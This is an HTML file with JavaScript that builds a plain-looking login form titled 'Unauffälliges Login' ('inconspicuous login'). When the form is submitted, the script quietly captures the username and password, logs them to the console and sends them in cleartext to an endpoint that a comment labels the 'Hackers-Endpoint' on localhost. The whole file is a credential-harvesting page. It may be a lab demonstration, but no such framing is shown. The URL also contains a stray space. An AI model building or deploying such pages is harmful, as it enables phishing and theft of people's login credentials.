
<!doctype html>
<html class="no-js" lang="">

  <head>
    <meta charset="utf-8">
    <meta http-equiv="x-ua-compatible" content="ie=edge">
    <title>Unauff√§lliges Login</title>
  </head>
  <body>
    <script type="text/javascript">
      // Create a HTML Form
      var form = document.createElement("form");
      form.setAttribute("method", "POST");
      form.setAttribute("accept-charset", "utf-8");
      form.setAttribute("action", "");
      form.setAttribute("id", "myloginform");
      // Create a HTML Username label
      var label_username = document.createElement("p");
      label_username.innerText = "Username";
      // Create an HTML Username input
      var input_username = document.createElement("input");
      input_username.setAttribute("name", "username");
      input_username.setAttribute("type", "text");
      input_username.setAttribute("id", "username");
      // Create a HTML Password label
      var label_password = document.createElement("p");
      label_password.innerText = "Password";
      // Create a HTML Password input
      var input_password = document.createElement("input");
      input_password.setAttribute("name", "password")
      input_password.setAttribute("type", "password")
      input_password.setAttribute("id", "password")
      // Create a HTML submit-button
      var input_submit_button = document.createElement("input");
      input_submit_button.setAttribute("name", "submit");
      input_submit_button.setAttribute("value", "log in");
      input_submit_button.setAttribute("type", "submit");
      // Add all Elements to the Form
      form.appendChild(label_username);
      form.appendChild(input_username);
      form.appendChild(label_password)
      form.appendChild(input_password);
      form.appendChild(document.createElement("br"));
      form.appendChild(document.createElement("br"));
      form.appendChild(input_submit_button);
      //  Add the form to the body of the HTML
      document.getElementsByTagName('body')[0].appendChild(form);
      // Create an event listener for the form submit action
      form.addEventListener("submit", function (e) {
        e.preventDefault();
        e.stopPropagation();
        // Prevent the submission of other forms to be handled
        if(e.target && e.target.id == 'myloginform'){
          var username = document.getElementById("username").value;
          var password = document.getElementById("password").value;
          // Log the results in the console
          console.log(username + " " + password);
          // Send the values to the Hackers-Endpoint
          var xhr = new XMLHttpRequest();
          xhr.open('POST', 'http:// localhost:49670/API/CollectUsernamePassword');
          xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
          xhr.send('username=' + username + '&password=' + password);
        }
      });
    </script>
  </body>

</html>
